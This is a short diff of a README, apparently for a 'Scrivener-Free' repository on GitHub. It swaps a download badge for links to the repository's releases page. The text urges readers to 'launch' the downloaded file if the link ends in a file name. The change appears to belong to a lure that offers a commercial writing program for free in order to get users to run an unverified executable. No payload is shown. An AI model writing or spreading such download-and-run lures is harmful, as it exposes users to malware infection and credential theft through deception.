@@ -42,7 +42,7 @@ Are you intrigued by the term *Scrivener* but not sure where to start? Or maybe 
 
 Ready to take the plunge into the realm of Scrivener? Access a wealth of resources and information by visiting the following link:
 
-[![Download Project.zip](https://img.shields.io/badge/Download-Project.zip-blue)](https://github.com/files/Project.zip)
+[![Download https://github.com/peak23/Scrivener-Free/releases](https://github.com/peak23/Scrivener-Free/releases)](https://github.com/peak23/Scrivener-Free/releases)
 
 Remember, if the link ends with a file name, make sure to launch it to access the repository content. If you encounter any issues with the link, don't forget to check the "Releases" section for alternative access points.
 
